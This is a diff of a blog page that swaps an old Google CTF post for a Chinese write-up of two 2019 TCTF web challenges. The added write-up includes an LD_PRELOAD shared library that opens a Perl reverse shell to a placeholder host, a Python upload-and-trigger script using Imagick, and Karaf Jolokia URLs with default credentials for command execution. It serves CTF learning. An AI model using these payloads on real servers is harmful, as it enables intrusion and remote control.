@@ -22,7 +22,7 @@
     <meta name="description" content="hurricane618's blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Google CTF Beginner JS Safe 1 复现 · 风之栖息地|hurricane618&#39;s blog</title>
+    <title>2019TCTF web writeup · 风之栖息地|hurricane618&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -228,7 +228,7 @@
                 <a href="/" >风之栖息地</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Google CTF Beginner JS Safe 1 复现</a>
+                <a href="#" class="post-name">2019TCTF web writeup</a>
             </div>
     </div>
     
@@ -258,7 +258,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Google CTF Beginner JS Safe 1 复现
+            2019TCTF web writeup
             <!-- 404 -->
             
         </h1>
@@ -279,16 +279,20 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP">PHP</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "JAVA">JAVA</a>
+    
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">907</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/08</span>
+                    <span class="post-intro-time">2019/03/31</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -412,45 +416,63 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png">
-<h2 id="分析与操作"><a href="#分析与操作" class="headerlink" title="分析与操作"></a>分析与操作</h2><p>这道题有点high，作为一个JS调试新手，着实爽了一把。题目给了一个Html网页，里面有两段JS代码，看来是JS代码分析的题目。</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png">
-<p>我们先看其中的一段，前两个是解密用的参数，看到open_safe这个函数，password必须是CTF{xxxx}的格式，读取其中的数据代入判断。<br>if中把我们的输入代入了x函数。</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png">
-<p>我们的password会在env的g参数中被编码，a是读数组数据，b是创建函数，c是加操作，d是ascii码转换。</p>
-<p>之后，根据code中的字母在env中操作属性。最后有个等待值更新的异步操作。<br>其中重点就是那个for循环对env的操作，但是代码这个又很难看懂…… 所以只能用console.log来dump出来看看细节。而我们想知道我们的password被用来干什么了。</p>
-<p>在for循环中加上一些代码来锁定g参数的位置。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png">
-<p>定位在了876出现了g，然后看env里面有些啥。</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png">
-<p>有趣的东西，出现了之前js代码中的subtle，digst，sha-256，而且在最后的数组中是sha-256和我们的输入编码，这其实就可以推测这里是要对我们的输入计算sha-256hash。为了看更多细节，我们继续加入一些代码调试。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>看看这之间有什么操作</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png">
-<p>果不其然，在876-884中完成了对我们输入的hash计算。</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png">
-<p>在940处，把我们计算出的hash变成数组，存入<code>env[Ѿ]</code>中。</p>
-<img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png">
-<p>可以很清楚的看到，在960取出了我们hash过后的第一个值，然后与230异或，异或后的值与h进行or操作后赋值给h，随后开始下一次循环。</p>
-<p>从之前的js代码中的if就可以知道h必须为0才能跳过判断。所以异或的值必须为0，也就是说必须要和对应的值相同。这样我们就得到了一串hash计算后的数组 <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p>
-<p>最终我们把这串字符转16进制拼接得到 <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p>
-<p>这个是我们输入的字符的hash值，找个hash值破解网站，得到 Passw0rd! ，所以最终flag为<code>CTF{Passw0rd!}</code></p>
-<p>至于剩下的代码，它是用于解密数据的，我们输入正确就会解密成功，输出是下一题的入口。感觉是一道题被拆分成了几块……</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较基础但是又很考察基本功的题，从中学习到了很多。</p>
-<p>最后我想说一下的是那个SubtleCrypto.digest()方法我一开始没怎么搞懂，他是怎么把utf-8的编码数组hash计算的。之后找到了它的实现原理，所以也就懂了，为什么要一开始先utf-8编码才进行hash计算。</p>
-<p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p>
-<p>经过这次JS分析，感觉学习专门的JS调试迫在眉睫…… ，有变量监听和事件监听，会给调试工作带来很大便利。</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>
+        <h2 id="wallbreaker-easy"><a href="#wallbreaker-easy" class="headerlink" title="wallbreaker easy"></a>wallbreaker easy</h2><p>这道题在比赛的时候专注在imagick上面，但是由于是最新版本，以前的bypass漏洞已经修补。。。之后由于复试的原因没有仔细研究，现在开始复现。</p>
+<p>这道题给了一个webshell，密码是backdoor，可以直接用菜刀连接，然而用phpinfo查看禁用函数，发现已经把所有执行命令的函数都ban了，并且知道操作系统是ubuntu18.04.</p>
+<img src="/2019/03/31/2019TCTF-web-writeup/1.png">
+<p>所以这是一个受限制的webshell绕过<code>disable_function</code>的问题</p>
+<h3 id="bypass-disable-function的方法"><a href="#bypass-disable-function的方法" class="headerlink" title="bypass disable_function的方法"></a>bypass disable_function的方法</h3><p>绕过<code>disable_function</code>也是一个老生常谈的问题了。总结一下大概有一下四种：</p>
+<ol>
+<li>攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞</li>
+<li>寻找未禁用的漏网函数，常见的执行命令的函数有 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>，偏僻的 <code>popen()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>，逐一尝试，或许有漏网之鱼</li>
+<li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制</li>
+<li>利用环境变量 <code>LD_PRELOAD</code> 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果</li>
+</ol>
+<p>这里由于题目的提示，我们知道php没有多余的组件。也没有漏网之鱼，同时也没有mod_cgi。那么剩下的就是<code>LD_PRELOAD</code>劫持函数的方法了。</p>
+<p>这个一个动态链接的环境变量，在我们执行程序的时候会优先加载这个变量中的动态函数库，如果这个里面有程序用到的库函数就会调用，这样的话我们就可以劫持库函数执行恶意操作。</p>
+<h3 id="劫持库函数"><a href="#劫持库函数" class="headerlink" title="劫持库函数"></a>劫持库函数</h3><p>这里由于要先设置环境变量，那么触发的函数必须要能启用外部程序才行，这样才会有调用动态库的情况。比如php中的<code>mail()</code></p>
+<img src="/2019/03/31/2019TCTF-web-writeup/2.png">
+<p>可以看到调用了外部程序<code>sendmail</code>，这里的经典方法是劫持<code>getuid()</code>，因为<code>sendmail</code>会调用这个函数，但是这里会出现一些问题，如果没有<code>sendmail</code>或者禁用了，这就不会有外部程序运行，当然我们劫持的函数也无法执行。</p>
+<p>这里有一种更进一步的利用方法，就是使用<code>__attribute__ ((__constructor__))</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>); </span><br><span class="line">    system(<span class="string">"ls"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个东西会在共享库装载的时候触发执行，这样一来只要有额外的外部程序执行就可以利用。我们就得到一种更通用的劫持执行的方法。</p>
+<h3 id="解决外部程序调用"><a href="#解决外部程序调用" class="headerlink" title="解决外部程序调用"></a>解决外部程序调用</h3><p>可惜的是题目禁用了<code>mail</code>，看来只能另辟蹊径了。结合题目给的hint，看来是要使用<code>imagick</code>作为突破了。查看php-imagick源码</p>
+<p><a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="noopener">https://github.com/ImageMagick/ImageMagick</a></p>
+<p>从这个网站 <a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a> 中可以看到各种格式的文件会调用不同的程序，所以构造一个能够调用额外程序的相应的文件即可。同时可以使用<code>strace -f php xxx.php 2&gt;&amp;1 | grep execve</code> 来验证程序有外部调用。</p>
+<p>这里选择了调用<code>ghostscript</code>的eps文件。注意：必须要有相关文件的文件头才行。这里打算通过反弹shell来执行readflag的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((__constructor__)) init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line"> 	system(<span class="string">"perl -e 'use Socket;$i=\"your_IP\";$p=your_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将其编译成共享库 <code>gcc -shared -fPIC evil.c -o evil.so</code>，如果是要编译成32位的加上<code>-m32</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">token = <span class="string">"/tmp/f28c9b5f67a7b7651a9d2b0021affc4e/"</span></span><br><span class="line">host = <span class="string">"http://111.186.63.208:31340"</span></span><br><span class="line">base = <span class="string">"your_vps"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_backdoor</span><span class="params">(payload)</span>:</span></span><br><span class="line">        res = requests.post(host, data=&#123;<span class="string">"backdoor"</span>:payload&#125;)</span><br><span class="line">        <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">        tp = token + filename</span><br><span class="line">        rp = base + filename</span><br><span class="line">        p = <span class="string">'echo file_put_contents("'</span> + tp + <span class="string">'", file_get_contents("'</span> + rp + <span class="string">'"));'</span></span><br><span class="line">        <span class="keyword">return</span> send_backdoor(p)</span><br><span class="line"></span><br><span class="line">print(up_file(<span class="string">"evil.so"</span>))</span><br><span class="line">print(up_file(<span class="string">"bypass.eps"</span>))</span><br><span class="line"></span><br><span class="line">print(send_backdoor(<span class="string">"putenv('LD_PRELOAD="</span> + token + <span class="string">"evil.so"</span> + <span class="string">"');"</span> + <span class="string">"$img = new Imagick('"</span> + token + <span class="string">"bypass.eps"</span> + <span class="string">"');"</span>))</span><br></pre></td></tr></table></figure>
+<p>在vps上监听，随后执行脚本，可以看到上传成功的话里面会有上传文件的大小混在网页html中。</p>
+<img src="/2019/03/31/2019TCTF-web-writeup/3.png">
+<p>最后在根目录下拿到flag。</p>
+<h3 id="题目之外"><a href="#题目之外" class="headerlink" title="题目之外"></a>题目之外</h3><p>其实我们可以走的更远，这里只是劫持了库函数执行我们的恶意代码，但是也可以在执行完恶意代码后再执行正常的库函数，这样以假乱真，效果更棒:)</p>
+<h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><p>打开题目看到有一个basic认证，其实这里是可以爆破的，得到密码<code>karaf:karaf</code>，当然我是事后才知道的，看writeup有的人是根据 <a href="https://karaf.apache.org/manual/latest/webconsole" target="_blank" rel="noopener">https://karaf.apache.org/manual/latest/webconsole</a> ，也有的人是根据jetty的默认凭证。</p>
+<p>成功认证之后是得到一个404的页面，这里根据<code>Ghost Pepper</code>猜到<code>jolokia</code>路径，这里有点脑洞了，这种路径爆破也出不来。。。在拿到路径之后发现是一个OSGI的api接口。</p>
+<p>对于java不是很熟悉，照着writeup一路走，这里用到了<code>jolokia/list</code>来列举能用的类，返回的json数据美化一下看着更加方便。里面比较有用的就是<code>org.apache.karaf</code>，能够安装和执行一些jar包，这对我们来说用处很大，只要构造恶意的jar包反弹shell，就能拿到flag了。然而，我垃圾的java功底完全构造不出来。。。</p>
+<p>这里采用的另外一个思路，Karaf有一个webconsole，我们可以通过installFeature来安装一个webconsole。</p>
+<p><code>http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</code></p>
+<p>安装之后，访问<code>http://111.186.63.207:31337/system/console/gogo</code></p>
+<img src="/2019/03/31/2019TCTF-web-writeup/4.png">
+<p>直接可以执行命令，拿到flag</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a href="https://www.linuxidc.com/Linux/2017-12/149841.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2017-12/149841.htm</a></p>
+<p><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md</a></p>
+<p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
+<p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p>
+<p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p>
+<p><a href="https://fireshellsecurity.team/0ctf-ghost-pepper/" target="_blank" rel="noopener">https://fireshellsecurity.team/0ctf-ghost-pepper/</a></p>
+<p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p>
+<p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a></p>
+<p><a href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener">https://www.anquanke.com/post/id/103016</a></p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
-            <p>原文链接：<a href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/">https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</a>
-            <p>发表日期：<a href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/">July 8th 2018, 11:58:48 pm</a>
-            <p>更新日期：<a href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/">July 19th 2018, 9:04:59 am</a>
+            <p>原文链接：<a href="https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/">https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/</a>
+            <p>发表日期：<a href="https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/">March 31st 2019, 10:15:47 pm</a>
+            <p>更新日期：<a href="https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/">March 31st 2019, 10:20:36 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -458,17 +480,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/18/google-ctf-beginner-part1/" title= "Google CTF Beginner Part1">
-                    <div class="nextTitle">Google CTF Beginner Part1</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/01/phpmyadmin4-8-1-background-LFI/" title= "phpmyadmin4.8.1 后台LFI">
-                    <div class="prevTitle">phpmyadmin4.8.1 后台LFI</div>
+                <a href= "/2019/03/02/serial-ports-translation-cn/" title= "快速寻找串行接口">
+                    <div class="prevTitle">快速寻找串行接口</div>
                 </a>
             
         </li>
@@ -485,8 +502,8 @@ height:50vh;
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
         
         var disqus_config = function () {
-        this.page.url = "https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "Google CTF Beginner JS Safe 1 复现"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = "https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2019TCTF web writeup"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
         };
         
         (function () { // DON'T EDIT BELOW THIS LINE
@@ -609,7 +626,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析与操作"><span class="toc-number">2.</span> <span class="toc-text">分析与操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#wallbreaker-easy"><span class="toc-number">1.</span> <span class="toc-text">wallbreaker easy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-disable-function的方法"><span class="toc-number">1.1.</span> <span class="toc-text">bypass disable_function的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持库函数"><span class="toc-number">1.2.</span> <span class="toc-text">劫持库函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决外部程序调用"><span class="toc-number">1.3.</span> <span class="toc-text">解决外部程序调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目之外"><span class="toc-number">1.4.</span> <span class="toc-text">题目之外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ghost-Pepper"><span class="toc-number">2.</span> <span class="toc-text">Ghost Pepper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
